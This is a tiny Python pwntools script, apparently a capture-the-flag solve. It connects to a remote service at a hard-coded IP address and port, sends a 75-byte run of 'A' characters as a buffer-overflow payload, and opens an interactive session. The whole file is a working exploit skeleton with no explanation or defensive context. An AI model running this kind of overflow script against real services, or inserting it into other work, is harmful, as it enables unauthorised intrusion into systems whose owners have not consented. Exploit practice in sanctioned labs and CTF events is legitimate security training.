from pwn import *

p = remote("165.22.52.41", 1337)

context.log_level="debug"

p.sendline(b"A"*64 + b"A"*8 + b"A"*3)

p.interactive()
